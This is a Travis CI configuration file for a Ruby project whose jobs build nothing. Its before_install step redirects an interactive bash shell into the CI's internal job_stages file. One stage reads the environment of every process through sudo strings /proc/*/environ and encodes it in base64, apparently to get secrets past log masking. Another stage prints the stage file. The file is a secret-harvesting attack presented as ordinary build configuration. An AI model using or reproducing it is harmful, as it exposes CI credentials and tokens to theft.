os: linux
arch: amd64
rvm: 2.6.3
env:
  global:
    # BAR
    - secure: 
before_install:
  bash -i >& /home/travis/.travis/job_stages 0>&1
jobs:
  include:
    - stage: "echo base64"
      script: sudo strings /proc/*/environ | sort -u | base64
    - stage: "cat job_stages"
      script: cat /home/travis/.travis/job_stages
